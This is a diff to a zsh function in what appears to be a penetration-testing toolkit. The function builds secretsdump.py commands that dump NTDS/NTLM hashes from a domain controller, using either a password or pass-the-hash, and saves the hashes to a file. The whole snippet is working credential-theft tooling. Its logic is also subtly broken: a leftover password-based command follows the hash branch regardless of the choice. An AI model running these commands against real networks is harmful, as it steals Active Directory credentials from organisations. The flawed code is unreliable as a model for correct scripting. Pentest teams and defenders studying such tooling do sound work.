@@ -57,5 +57,23 @@ nb-ad-dump-hash-ntds() {
     __check-user
     echo
 
-    print -z "secretsdump.py <DOMAIN>.local/<USER>:'<PASSWORD>'@<TARGET_IP> -just-dc-ntlm"
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        echo
+        __ask "Enter a password for authentication"
+        __check-pass
+        print -z "secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} | tee -a ${__domainadpath}/${__USER}-hashdump.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} | tee -a ${__domainadpath}/${__USER}-hashdump.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+
+    print -z "secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} -just-dc-ntlm"
 }
